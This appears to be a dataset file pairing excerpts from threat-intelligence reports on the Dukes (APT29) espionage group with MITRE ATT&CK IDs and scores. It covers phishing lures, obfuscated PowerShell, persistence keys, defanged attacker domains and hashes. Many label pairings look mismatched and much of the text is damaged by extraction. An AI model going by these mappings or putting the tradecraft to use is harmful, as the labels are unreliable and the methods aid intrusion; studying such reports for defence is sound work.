Details for the domain were later changed, providing a small glimpse of the Dukes' sense of humor. The Dukes actively targeted Ukraine before the crisis, at a time when Russia was still weighing her options, but once Russia moved from diplomacy to direct action, Ukraine was no longer relevant to the Dukes in the same way. The Dukes continued the expansion of their arsenal in 2011 with the addition of two more toolsets: MiniDuke and CozyDuke. The Dukes have consistently operated large-scale campaigns against high-profile targets while concurrently engaging in smaller, more targeted campaigns with apparent coordination and no evidence of unintentional overlap or operational clashes. The Dukes primarily target Western governments and related organizations, such as government ministries and agencies, political think tanks, and governmental subcontractors. The Dukes rapidly react to research being published about their toolsets and operations. The earliest activity we have been able to definitively attribute to the Dukes are two PinchDuke campaigns from November 2008. The only instances which we are aware of where the Dukes did not use spear-phishing as the initial infection vector is with certain OnionDuke variants. The story of the Dukes, as it is currently known, begins with a malware toolset that we call PinchDuke. This does however still rule out the possibility that the Dukes simply obtained copies of the exploit binaries described by FireEye and repurposed them. This indication that the Dukes planned to use an arsenal of 5 malware toolsets in parallel suggests that they were operating with both significant resources and capacity. This paper has already stated that we believe the Dukes to be a Russian state-sponsored cyberespionage operation. This supports our analysis that the overarching theme in the Dukes' targeting is the collection of intelligence to support diplomatic efforts. This whitepaper explores the tools - such as MiniDuke, CosmicDuke, OnionDuke, CozyDuke, etc- of the Dukes, a well-resourced, highly dedicated and organized cyberespionage group that we believe has been working for the Russian Federation since at least 2008 to collect intelligence in support of foreign and security policy decision-making. To spread the toolset, the Dukes used a wrapper to combine OnionDuke with legitimate applications, created torrent files containing these trojanized applications, then uploaded them to websites hosting torrent files (image 4, above). We also believe the tasking to have been temporary, because we have not observed any further similar targeting from the Dukes after the spring of 2014. We therefore believe that the Dukes group simply failed to update the computer they were using to compile GeminiDuke samples, so that the timestamps seen in later samples still appear to follow the old definition of Moscow Standard Time.","T1637.001","T","0.967893","0.032107","0.967893","0.935786","True","keep"
"F-Secure's whitepaper [5] on CosmicDuke includes a timeline of the loader's usage, based on compilation timestamps.","T0852","T","0.923525","0.076475","0.923525","0.84705","True","keep"
"Much like the CosmicDuke toolset, the loader used by both MiniDuke and CosmicDuke had previously only undergone one major update (the Nemesis Gemina upgrade) since the first known samples from 2010.","S0177","S","0.966532","0.033469","0.966532","0.933063","True","keep"
"Another is a loader variant seen during the spring of 2010 in conjunction with both CosmicDuke and PinchDuke. Much like the CosmicDuke toolset, the loader used by both MiniDuke and CosmicDuke had previously only undergone one major update (the Nemesis Gemina upgrade) since the first known samples from 2010. The GeminiDuke infostealer has occasionally been wrapped with a loader that appears to be unique to GeminiDuke and has never been observed being used with any of the other Duke toolsets. The loader used by the sample purported to have been compiled on the 25 th of March 2010. These resulted in a loader version that would later become known as the 'Nemesis Gemina loader' due to PDB strings found in many of the samples. They could have ceased all use of CosmicDuke (at least until they had developed a new loader) or retired it entirely, since they still had other toolsets available. This neatly ties together many of the tools used by the Dukes group, as versions of this one loader have been used to load malware from three different Dukes-related toolsets - CosmicDuke, PinchDuke, and MiniDuke - over the course of five years. To avoid confusion however, we have decided to continue referring to the loader as the 'MiniDuke loader'. While the loader has often been used together with other MiniDuke components, it has also commonly been used in conjunction with CosmicDuke and PinchDuke.","T1645","T","0.923939","0.076061","0.923939","0.847878","True","keep"
"All MiniDuke components, from the loader and downloader to the backdoor, had been slightly updated and modified during the downtime.","S0471","S","0.939003","0.060997","0.939003","0.878006","True","keep"
"A shared supplier of malware would explain the overlap in tools, but it would not explain the significant overlap we have also observed in operational techniques related to command and control infrastructure.","TA0011","T","0.932125","0.067875","0.932125","0.86425","True","keep"
"Kaspersky Labs, who sometimes refer to CosmicDuke as 'Bot Gen Studio', speculated that 'one possibility is that 'Bot Gen Studio' is a malware platform also available as a so-called 'legal spyware' tool'; therefore, those using CosmicDuke to target drug dealers and those targeting governments are two separate entities [11] .","S0266","S","0.95259","0.04741","0.95259","0.90518","True","keep"
"Screenshot of a decoy document appearing to be an order for growth hormones, which was used in a CosmicDuke campaign in September 2013.","S0414","S","0.605028","0.394972","0.605028","0.210056","True","keep"
"This indication that the Dukes planned to use an arsenal of 5 malware toolsets in parallel suggests that they were operating with both significant resources and capacity.","S0018","S","0.9422","0.0578","0.9422","0.8844","True","keep"
"OnionDuke's development therefore could not have been simply a response to the outing of one of the other Duke malware, but was instead intended for use alongside the other toolsets.","S0070","S","0.930911","0.069089","0.930911","0.861822","True","keep"
"To spread the toolset, the Dukes used a wrapper to combine OnionDuke with legitimate applications, created torrent files containing these trojanized applications, then uploaded them to websites hosting torrent files (image 4, above).","T1608.001","T","0.894346","0.105654","0.894346","0.788692","True","keep"
"Specifically, the only known infection vector for HammerDuke is to be downloaded and executed by CozyDuke onto a victim that has already been compromised by that toolset. What makes OnionDuke especially curious is an infection vector it began using during the summer of 2013.","S1024","S","0.975907","0.024093","0.975907","0.951814","True","keep"
"In fact, we saw yet another Duke malware toolset, OnionDuke, appear first in 2013.","S0052","S","0.543186","0.456814","0.543186","0.0863719999999999","True","keep"
"As mentioned by Kaspersky, even though the exploits used for these MiniDuke campaigns were near-identical to those described by FireEye, there were nevertheless small differences.","S0113","S","0.504511","0.495489","0.504511","0.00902200000000003","True","keep"
"As mentioned by Kaspersky, even though the exploits used for these MiniDuke campaigns were near-identical to those described by FireEye, there were nevertheless small differences. Of these, the crucial one is the presence of PDB strings in the MiniDuke exploits. One might argue that since this took place after the exploits were publicly mentioned, the Dukes simply copied them.","S0084","S","0.92667","0.07333","0.92667","0.85334","True","keep"
"In fact, in 2009 a PinchDuke sample had been included in the malware set used by the AV-Test security product testing organization to perform anti-virus product comparison reviews.","S0396","S","0.958985","0.041015","0.958985","0.91797","True","keep"
"One of the Ukraine-themed decoy documents used during a MiniDuke campaign in February 2013.","S0689","S","0.922695","0.077305","0.922695","0.84539","True","keep"
"Finally, early CozyDuke versions also featured other elements that one would associate more with a traditional software development project than with malware.","S0046","S","0.791401","0.208599","0.791401","0.582802","True","keep"
"All of the 4 previously mentioned toolsets were written in a minimalistic style commonly seen with malware; MiniDuke even goes as far as having many components written in Assembly language.","S0177","S","0.974147","0.025853","0.974147","0.948294","True","keep"
"The first observed samples of the MiniDuke backdoor component are from May 2011.","S0031","S","0.972488","0.027512","0.972488","0.944976","True","keep"
"Continuing expansion of the Dukes arsenal By 2011, the Dukes had already developed at least 3 distinct malware toolsets, including a plethora of supporting components such as loaders and persistence modules. In previous cases, the group used their malware toolsets interchangeably, as either the initial or a later-stage toolset in a campaign.","S0052","S","0.974586","0.025414","0.974586","0.949172","True","keep"
"John Kasai of Klagenfurt, Austria During 2011, the Dukes appear to have significantly expanded both their arsenal of malware toolsets and their C&C infrastructure.","S0387","S","0.950322","0.049678","0.950322","0.900644","True","keep"
"This neatly ties together many of the tools used by the Dukes group, as versions of this one loader have been used to load malware from three different Dukes-related toolsets - CosmicDuke, PinchDuke, and MiniDuke - over the course of five years.","S0053","S","0.528427","0.471573","0.528427","0.056854","True","keep"
"In fact, we now know that before being used with either, the 'MiniDuke loader' was used to load PinchDuke. Like the 'MiniDuke loader', these 'John Kasai' domains also provide a common thread tying together much of the tools and infrastructure of the Dukes. Some hints about the history of the 'MiniDuke loader' were noted in the CosmicDuke whitepaper we published [5] in 2014, where we observed that the loader appeared to have been in use with CosmicDuke before it was used with MiniDuke. To avoid confusion however, we have decided to continue referring to the loader as the 'MiniDuke loader'.","S0177","S","0.810642","0.189358","0.810642","0.621284","True","keep"
"If the compromised target is discovered to be of value, the Dukes will quickly switch the toolset used and move to using stealthier tactics focused on persistent compromise and long-term intelligence gathering.","T1630.003","T","0.954118","0.045882","0.954118","0.908236","True","keep"
"Importantly, PinchDuke trojan samples always contain a notable text string, which we believe is used as a campaign identifier by the Dukes group to distinguish between multiple attack campaigns that are run in parallel. The first of these runs used the campaign identifier 'natoinfo_ge', an apparent reference to the www.natoinfo.ge website belonging to a Georgian political body that has since been renamed 'Information Centre on NATO and EU'. This belief is based on the observation that in all of the other PinchDuke samples we have analyzed, the date of the campaign identifier has been within a day of the compilation date.","T1655.001","T","0.972592","0.027408","0.972592","0.945184","True","keep"
"The earliest activity we have been able to definitively attribute to the Dukes are two PinchDuke campaigns from November 2008.","S0048","S","0.514929","0.485071","0.514929","0.029858","True","keep"
"As researchers continued discovering new toolsets that were created and used by the same group that had been operating MiniDuke, the new toolsets were also given 'Duke'-derived names, and thus the threat actor operating the toolsets started to be commonly referred to as 'the Dukes'. Both toolsets were originally spotted being deployed by CozyDuke to its victims.","S0023","S","0.876682","0.123318","0.876682","0.753364","True","keep"
"As we now know, by February 2013 the Dukes group had been operating MiniDuke and other toolsets for at least 4 and a half years. First known campaigns against the West Based on the campaign identifiers found in PinchDuke samples discovered from 2009, the targets of the Dukes group during that year included organizations such as the Ministry of Defense of Georgia and the ministries of foreign affairs of Turkey and Uganda. Hiding in the shadows We still know surprisingly few specifics about the Dukes group's activities during 2012.","S0550","S","0.950892","0.049108","0.950892","0.901784","True","keep"
"These campaigns utilized specially-crafted malicious Microsoft Word documents and PDF files, which were sent as e-mail attachments to various personnel in an attempt to infiltrate the targeted organizations.","T0863","T","0.938345","0.061655","0.938345","0.87669","True","keep"
"[2] (circa 2008, preserved by the Internet Archive Wayback Machine), which was referenced in 2008 PinchDuke sample.","S0048","S","0.430696","0.569304","0.430696","-0.138608","True","keep"
"Back then, CosmicDuke still lacked most of the credential-stealing functionality found in later samples.","TA0006","T","0.926064","0.073936","0.926064","0.852128","True","keep"
"We believe that during the spring of 2010, the credential and file stealing capabilities of PinchDuke were slowly ported to CosmicDuke, effectively making PinchDuke obsolete.","T1552.001","T","0.791346","0.208654","0.791346","0.582692","True","keep"
"+RC4/Base64 OPERATIONS Compromised website IDENTIFY SYSTEM INSTALL SEADUKE C&C SERVER #SEADUKE #COZYDUKE Symantec _ @threatintel www symantec com 1 Seaduke operation Although Seaduke was developed in Python, the overall framework bears a striking resemblance to Cozyduke in terms of operation. How Seaduke operates on the target network HOW SEADUKE OPERATES ON THE TARGET NETWORK ATTACKER CLOUD SERVICES Email exfiltration RAR 110 character password AES encrypted HIGH PROFILE GOVERNMENT NETWORK OPERATIONS INSTALL PAYLOAD C&C communications HTTP/HTTPS LATERAL MOVEMENT RC4/AES/Base64 IMPERSONATION (PASS THE TICKET) Seaduke (detected by Symantec as Trojan. Seaduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2015-031915-4935-99&tabid=2). Seaduke securely communicates with the C&C server over HTTP/HTTPS beneath layers of encoding (Base64) and encryption (RC4, AES). The Seaduke control infrastructure is essentially distinct, opening up the possibility of sub-teams concurrently exploiting the target network. Unlike Cozyduke, Seaduke operators upload 'task' !","S0142","S","0.954946","0.045054","0.954946","0.909892","True","keep"
"Impersonation using Kerberos pass-the-ticket attacks (Mimikatz PowerShell) Email extraction from the MS Exchange Server using compromised credentials Archiving sensitive information Data ex ! ltration via legitimate cloud services Secure !","S0156","S","0.96699","0.03301","0.96699","0.93398","True","keep"
"They have the ability to retrieve detailed bot/system information, update bot con !","T0865","T","0.949004","0.050996","0.949004","0.898008","True","keep"
"How Seaduke operates on the target network HOW SEADUKE OPERATES ON THE TARGET NETWORK ATTACKER CLOUD SERVICES Email exfiltration RAR 110 character password AES encrypted HIGH PROFILE GOVERNMENT NETWORK OPERATIONS INSTALL PAYLOAD C&C communications HTTP/HTTPS LATERAL MOVEMENT RC4/AES/Base64 IMPERSONATION (PASS THE TICKET)","T1590.006","T","0.894024","0.105976","0.894024","0.788048","True","keep"
"Seaduke securely communicates with the C&C server over HTTP/HTTPS beneath layers of encoding (Base64) and encryption (RC4, AES).","TA0101","T","0.97254","0.027459","0.97254","0.945081","True","keep"
"Miniduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2013-030119-2820-99http://www.symantec.com/security_response/writeup.jsp?docid=2013-0301192820-99) and the more elusive Trojan. Seaduke (detected by Symantec as Trojan.","S0051","S","0.137679","0.862321","0.137679","-0.724642","True","keep"
"The malware hides behind numerous layers of encryption and obfuscation and is capable of quietly stealing and ex !","T1406","T","0.946061","0.053939","0.946061","0.892122","True","keep"
"In the months that followed, the Duke group began to target victims with 'O $ ce Monkeys'- and 'eFax'-themed emails, booby-trapped with a Cozyduke payload. The Duke group has brought its operational capability to the next level. While the Duke group began to distribute Cozyduke in an increasingly aggressive manner, Seaduke installations were reserved only for select targets.","S0665","S","0.907957","0.092043","0.907957","0.815914","True","keep"
"+RC4/Base64 OPERATIONS Compromised website IDENTIFY SYSTEM INSTALL SEADUKE C&C SERVER #SEADUKE #COZYDUKE Symantec _ @threatintel www symantec com 1 Seaduke operation Although Seaduke was developed in Python, the overall framework bears a striking resemblance to Cozyduke in terms of operation. Cozer (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2015-030500-0430-99&tabid=2) (aka Cozyduke) was identi ! ne-tuned computer network exploitation (CNE) skills Although Cozyduke activity was ! rst infected with Cozyduke and, if the computer appears to be a target of interest, the operators will install Seaduke.","S0665","S","0.873403","0.126597","0.873403","0.746806","True","keep"
"rst infected with Cozyduke and, if the computer appears to be a target of interest, the operators will install Seaduke.","S0648","S","0.936987","0.063013","0.936987","0.873974","True","keep"
"It has a range of malware tools at its disposal, known as the Dukes, including Cozyduke (Trojan.","S0046","S","0.927276","0.072724","0.927276","0.854552","True","keep"
"Cozer (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2015-030500-0430-99&tabid=2)), Miniduke (Backdoor.Miniduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2013-030119-2820-99http://www.symantec.com/security_response/writeup.jsp?docid=2013-0301192820-99)) and Cosmicduke (Backdoor.","S0093","S","0.33707","0.66293","0.33707","-0.32586","True","keep"
"Cozer (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2015-030500-0430-99&tabid=2) (aka Cozyduke) was identi ! Cozer (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2015-030500-0430-99&tabid=2)), Miniduke (Backdoor.Miniduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2013-030119-2820-99http://www.symantec.com/security_response/writeup.jsp?docid=2013-0301192820-99)) and Cosmicduke (Backdoor.","S0046","S","0.743287","0.256713","0.743287","0.486574","True","keep"
"Miniduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2013-030119-2820-99http://www.symantec.com/security_response/writeup.jsp?docid=2013-0301192820-99) and the more elusive Trojan. Miniduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2013-030119-2820-99http://www.symantec.com/security_response/writeup.jsp?docid=2013-0301192820-99) onto a compromised network. Miniduke has been the group's tool of choice for a number of years in espionage operations predominantly targeting government and diplomatic entities in Eastern Europe and ex-Soviet states. The Miniduke payload In July of 2014, the group instructed Cozyduke-infected computers to install Backdoor. This deployment of Miniduke and the technical similarities with Cozyduke provided strong indicators as to who was behind the attacks.","S0023","S","0.893411","0.106589","0.893411","0.786822","True","keep"
"Seaduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2015-031915-4935-99&tabid=2).","S0053","S","0.371008","0.628992","0.371008","-0.257984","True","keep"
"Miniduke has been the group's tool of choice for a number of years in espionage operations predominantly targeting government and diplomatic entities in Eastern Europe and ex-Soviet states.","S0689","S","0.971922","0.028078","0.971922","0.943844","True","keep"
"Tinybaron (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2014-052717-4610-99&tabid=2) (aka Cosmicduke) samples, which Symantec also attributes to the Duke group.","S0665","S","0.879569","0.120431","0.879569","0.759138","True","keep"
"Tinybaron (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2014-052717-4610-99&tabid=2) (aka Cosmicduke) samples, which Symantec also attributes to the Duke group. Tinybaron (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2014-052717-4610-99&tabid=2)).","S0414","S","0.478496","0.521504","0.478496","-0.043008","True","keep"
"The Seaduke framework was designed to be highly con !","S1022","S","0.496133","0.503867","0.496133","-0.00773399999999996","True","keep"
"The communication protocol employed had many layers of encryption and obfuscation, using over 200 compromised web servers for command and control.","T1639","T","0.953019","0.046981","0.953019","0.906038","True","keep"
"The Seaduke control infrastructure is essentially distinct, opening up the possibility of sub-teams concurrently exploiting the target network.","T0869","T","0.971302","0.028698","0.971302","0.942604","True","keep"
"Upgrade PowerShell to new versions with enhanced logging features and monitor the logs to detect usage of PowerShell commands, which are often malware-related.","S0371","S","0.971871","0.028129","0.971871","0.943742","True","keep"
"Consider restricting access to sensitive password hashes by using a shadow password file or equivalent on UNIX systems.","T1003.008","T","0.969431","0.03057","0.969431","0.938861","True","keep"
"Phishing and Spearphishing Implement a Sender Policy Framework (SPF) record for your organization's Domain Name System (DNS) zone file to minimize risks relating to the receipt of spoofed messages.","T1030","T","0.86248","0.13752","0.86248","0.72496","True","keep"
"Take steps to harden both Web applications and the servers hosting them to reduce the risk of network intrusion via this vector.","T1030","T","0.971974","0.028026","0.971974","0.943948","True","keep"
"Figure 1: The tactics and techniques used by APT29 and APT 28 to conduct cyber intrusions against target systems ADVERSARY SPACE NEUTRAL SPACE VICTIM SPACE In the course of that campaign, APT29 successfully compromised a U.S. political party. Two separate Russian espionage groups Pushes Establishes encrypted communication with APT29 TRADECRAFT Powershell comand Scheduled execution Implant Unique encryption keys Leverages APT29 Silently exfiltrates data TARGETED SYSTEMS Operational Infrastructure Deploys Installs onto X-Agent Leverages APT28 TRADECRAFT","S0139","S","0.979439","0.020561","0.979439","0.958878","True","keep"
"Figure 1: The tactics and techniques used by APT29 and APT 28 to conduct cyber intrusions against target systems ADVERSARY SPACE NEUTRAL SPACE VICTIM SPACE","TA0041","T","0.873697","0.126303","0.873697","0.747394","True","keep"
"Using the harvested credentials, APT28 was able to gain access and steal content, likely leading to the exfiltration of information from multiple senior party members.","TA0006","T","0.936092","0.063908","0.936092","0.872184","True","keep"
"When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IPs attempting to connect to their systems.","T1018","T","0.96957","0.03043","0.96957","0.93914","True","keep"
"Injection Flaws are broad web application attack techniques that attempt to send commands to a browser, database, or other system, allowing a regular user to control behavior.","T1674","T","0.961682","0.038318","0.961682","0.923364","True","keep"
"For example, the use of 'FromBase'+0x40+'String', in place of FromBase64String, the PowerShell command used to decode base64. The decoded command consisted of additional PowerShell that read the content of ds7002.lnk from o $ set 0x5e2be to o $ set 0x623b6, base64 decoded the extracted content, and executed it as additional PowerShell content.","S0371","S","0.691354","0.308646","0.691354","0.382708","True","keep"
"It has also been over a year since we have conclusively identi # ed APT29 activity, which raises questions about the timing and the similarities of the activity a & er such a long interlude. activity targeted some of the same recipients of this email campaign, and APT29 has leveraged large waves of emails in previous campaigns. new activity (le "" ) and old activity (right) Figure 8: Shared string obfuscation logic: new LNK activity (le "" ) and old VERNALDROP activity (right) Indicators","S0394","S","0.941919","0.058081","0.941919","0.883838","True","keep"
"The sample was con # gured to use a malleable C2 pro # le for its network communications.","S0529","S","0.733105","0.266895","0.733105","0.46621","True","keep"
"For example, the use of 'FromBase'+0x40+'String', in place of FromBase64String, the PowerShell command used to decode base64.","T1623","T","0.819497","0.180503","0.819497","0.638994","True","keep"
"For network defenders, whether or not this activity was conducted by APT29 should be secondary to properly investigating the full scope of the intrusion, which is of critical impo "" ance if the elusive and deceptive APT29 operators indeed had access to your environment. It has also been over a year since we have conclusively identi # ed APT29 activity, which raises questions about the timing and the similarities of the activity a & er such a long interlude.","S0674","S","0.982882","0.017118","0.982882","0.965764","True","keep"
"Notable di $ erences include the use of Cobalt Strike, rather than custom malware; however, many espionage actors do use publicly and commercially available frameworks for reasons such as plausible deniability.","TA0011","T","0.976602","0.023398","0.976602","0.953204","True","keep"
"The sho "" cut # le was cra & ed to execute a PowerShell command that read, decoded, and executed additional code from within the sho "" cut # le.","S1119","S","0.629642","0.370358","0.629642","0.259284","True","keep"
"Additional overlap was observed in the targeting and tactics employed in the phishing campaigns responsible for distributing these LNK # le.","TA0042","T","0.628989","0.371011","0.628989","0.257978","True","keep"
"For network defenders, whether or not this activity was conducted by APT29 should be secondary to properly investigating the full scope of the intrusion, which is of critical impo "" ance if the elusive and deceptive APT29 operators indeed had access to your environment.","T1630.003","T","0.922833","0.077167","0.922833","0.845666","True","keep"
"Technical Details Phishing Emails were sent from DOSOneDriveNoti # cations-svCT- Mailboxe36625aaa85747214aa50342836a2315aaa36928202aa46271691a8255aaa 15382822aa25821925a0245@no "" hshorehealthgm[.]org with the subject Stevenson, Susan N shared ""TP18-DS7002 (UNCLASSIFIED)"" with you.","T1566.001","T","0.249856","0.750144","0.249856","-0.500288","True","keep"
"This combined with their use of steganography to hide their backdoor within PNG files that are downloaded remotely and loaded in memory only or via alternate data streams (ADS) is quite novel in its approach.","T1630.003","T","0.966283","0.033717","0.966283","0.932566","True","keep"
"The group's anti-VM macros and PowerShell scripts appear to have drastically reduced the number of sandboxes and bots that the group has to deal with on their command and control infrastructure.","T1564.010","T","0.953153","0.046847","0.953153","0.906306","True","keep"
"They have had tremendous success evading anti-virus and anti-malware solutions at both the desktop and mail gateway levels.","S0665","S","0.952842","0.047158","0.952842","0.905684","True","keep"
"Volexity has dubbed this backdoor PowerDuke . Volexity suspects the feature set that has been built into PowerDuke is an extension of their anti-VM capabilities in the initial dropper files. shinfo shdel shadd setpng conn setsrv Volexity may update this post following further PowerDuke analysis.","S0145","S","0.97741","0.02259","0.97741","0.95482","True","keep"
"Volexity suspects the feature set that has been built into PowerDuke is an extension of their anti-VM capabilities in the initial dropper files.","S0177","S","0.972308","0.027692","0.972308","0.944616","True","keep"
"The PowerDuke Backdoor The PowerDuke backdoor boasts a pretty extensive list of features that allow the Dukes to examine and control a system.","S0223","S","0.965498","0.034502","0.965498","0.930996","True","keep"
"48803a7d988f9f9f43f Notes: Microsoft shortcut file with embedded PowerShell, PowerDuke backdoor (hqwhbr.lck), and clean decoy document.","S0371","S","0.725301","0.274699","0.725301","0.450602","True","keep"
"As seen in the screen shot above, the e-mail contained links pointing to the following URL: hxxp://efax.pfdregistry[.]net/eFax/37486.ZIP Inside of this password (6190) protected ZIP file a Microsoft Shortcut file named: 37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk Note that pfdregistry[.]net appears to be under the control of the attackers but may be a hijacked domain.","S0145","S","0.943481","0.056519","0.943481","0.886962","True","keep"
"39c2a7266132e0af016a48b97d565463d90 Notes: Alternate data stream (ADS) PNG file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA).","S0158","S","0.717521","0.282479","0.717521","0.435042","True","keep"
"Below are network indicators associated with command and control servers for the aforementioned Dukes attack campaigns. In July 2015, the Dukes started heavily targeting think tanks and NGOs. Most notably the Dukes have previously been tied to the breach of the Democratic National Committee (DNC) and intrusions into multiple high-profile United States Government organizations. The Dukes are known for launching their attacks by sending links to ZIP files, that contain malicious executables, hosted on legitimate compromised web servers. This appears to be consistent with several previous Dukes attack campaigns, such as those on August 25, 2016. Volexity believes that the Dukes are likely working to gain long-term access into think tanks and NGOs and will continue to launch new attacks for the foreseeable future.","T0848","T","0.970883","0.029117","0.970883","0.941766","True","keep"
"39c2a7266132e0af016a48b97d565463d90 Notes: Alternate data stream (ADS) PNG file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA). Notes: Alternate data stream (ADS) PNG file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA). ea095 Notes: Alternate data stream (ADS) PNG file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA).","S0031","S","0.975579","0.024421","0.975579","0.951158","True","keep"
"Notes: Alternate data stream (ADS) PNG file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA). ea095 Notes: Alternate data stream (ADS) PNG file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA).","T1027.003","T","0.94331","0.05669","0.94331","0.88662","True","keep"
"BLOG PowerDuke: Widespread Post-Election Spear Phishing Campaigns Targeting Think Tanks and NGOs NOVEMBER 9, 2016 by Steven Adair ??? ??? ???","S0387","S","0.884127","0.115873","0.884127","0.768254","True","keep"
"Follow us on Twitter: @Volexity, @stevenadair, @5ck, @imhlv2, @attrc APT, Dukes, elections, spear phishing Volexity has dubbed this backdoor PowerDuke .","S0145","S","0.944896","0.055104","0.944896","0.889792","True","keep"
"Similar attack campaigns using documents with macros dropping PowerDuke were further observed through October, where Universities, and not think tanks appear to have been the primary targets.","S1058","S","0.973709","0.026291","0.973709","0.947418","True","keep"
"Close the web browser Open the message0236.ZIP file in your secure email message.","T1471","T","0.936888","0.063112","0.936888","0.873776","True","keep"
"1395076 Notes: Primary PowerDuke backdoor (DLL) loader (leverages kxwn.lock:schemas) dropped to ""%APPDATA\Roaming\Microsoft\"" with persistence via HKCU Run Key ""WebCache"" (rundll32.exe %APPDATA\Roaming\Microsoft\kxwn.lock , #2).","S0393","S","0.830508","0.169492","0.830508","0.661016","True","keep"
"Please open the attachment election-headlines-FTE2016 in this email anc enter PIN CODE: 3209 SUBJECT:","S1024","S","0.944577","0.055423","0.944577","0.889154","True","keep"
"Document containing malicious macro that drops Filename: fywhx.dll File size: 10752 bytes MD5 hash: ad6723f61e10aefd9688b29b474a9323 SHA1 hash: dd766876b3be5022bfb062f454f878abfbc670b8 Notes: PowerDuke backdoor file dropped to ""%APPDATA\Roaming\HP\"" with persistence via HKCU Run Key ""ToolboxFX"" (rundll32.exe %APPDATA\Roaming\HP\fywhx.dll #2).","T1218.002","T","0.848813","0.151187","0.848813","0.697626","True","keep"
"SHA1 hash: ab32c09c46e0c9dbc576fefee68e5a2f57e0482e Notes: Alternate data stream (ADS) PNG file with the PowerDuke backdoor component hidden and encrypted within using Tiny Encryption Algorithm (TEA).","S0665","S","0.92707","0.07293","0.92707","0.85414","True","keep"
"Filename: RWP16-038_Norris.exe File size: 1144832 bytes MD5 hash: 3335f0461e5472803f4b19b706eaf4b5 SHA1 hash: 5cc807f80f14bc4a1d6036865e50d576200dfd2e Notes: Dropper for PowerDuke backdoor and clean decoy document Filename: gwV46iIc.idx File size: 10752 bytes MD5 hash: ae997d2047705 46a0c228f7b5d7052 ! an executable named: RWP16-038_Norris.exe Note that pfdresearch[.]org appears to be under the control of the attackers but may be a hijacked domain.","S0145","S","0.946725","0.053276","0.946725","0.893449","True","keep"
"Back to top TAGS Duke malware Forkmeiamfamous Threat Research Center Related Malware Resources T H R E AT R E S E A R C H December 20, 2024 Now You See Me, Now You Don't: Using LLMs to Obfuscate Malicious JavaScript Credential stealer Data Augmentation FraudGPT Seaduke Read now Symantec Trojan Next: APT Group UPS Targets US Government with Hacking Team Flash Exploit T H R E AT R E S E A R C H December 17, 2024 LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory Stately Taurus","S0023","S","0.866821","0.133179","0.866821","0.733642","True","keep"
"All network communications are performed over HTTP for this particular sample; however, it appears to support HTTPS as well.","S0070","S","0.967172","0.032828","0.967172","0.934344","True","keep"
"Main execution of malware Continuing along, we discover that this malware has the ability to persist using one of the following techniques: Persistence via PowerShell 1 2 Persistence via the Run registry key Persistence via a .lnk fi le stored in the Startup directory 3","T1547.014","T","0.941429","0.058571","0.941429","0.882858","True","keep"
"Obfuscation discovered in fi nal payload fi gure 4 Using a little brainpower and search/replace, we can begin identifying and renaming functionality within the malware.","T1027.009","T","0.819406","0.180594","0.819406","0.638812","True","keep"
"Additionally, Palo Alto Networks properly categorizes the URL used by Seaduke as malicious. Extracted Python fi les from Seaduke We can then use a tool such as uncompyle2 to convert the Python byte-code into the original source code. If the decrypted data does not produce proper JSON data, Seaduke will discard it and enter a sleep cycle.","S0142","S","0.954246","0.045754","0.954246","0.908492","True","keep"
"This program allows an individual to write a program using the Python scripting language and convert it into an executable for the Microsoft Windows, Linux, Mac OSX, Solaris, or AIX platform.","T1059","T","0.926857","0.073143","0.926857","0.853714","True","keep"
"Here are some of our observations: First Layer of Obfuscation Once the UPX packer is removed from the malware sample, it becomes quickly apparent that we're dealing with a sample compiled using PyInstaller .","S1164","S","0.926341","0.073659","0.926341","0.852682","True","keep"
"Win32.Seadask' by a number of anti-virus companies.","S0041","S","0.496278","0.503722","0.496278","-0.00744400000000001","True","keep"
"THREATS APT (Targeted attacks) Secure environment (IoT)","S1193","S","0.905534","0.094466","0.905534","0.811068","True","keep"
"* APT COZYDUKE SPYWARE The CozyDuke APT Your email address will not be published.","S0063","S","0.938929","0.061071","0.938929","0.877858","True","keep"
"Assembler 0x29A Micro Backdoor , Miniduke is back: Nemesis Gemina and the Botgen Studio Securelist, July 2014 , CrySyS, July 2014 MiniDuke 2 (CosmicDuke) , FCOSMICDUKE Cosmu with a twist of MiniDuke [pdf] Secure, September 2014 , Leviathan THE CASE OF THE MODIFIED BINARIES Security, October 2014 , Blaze's Security Blog, September A word on CosmicDuke 2014 , F-Secure, OnionDuke: APT Attacks Via the Tor Network November 2014","S0665","S","0.874525","0.125475","0.874525","0.74905","True","keep"
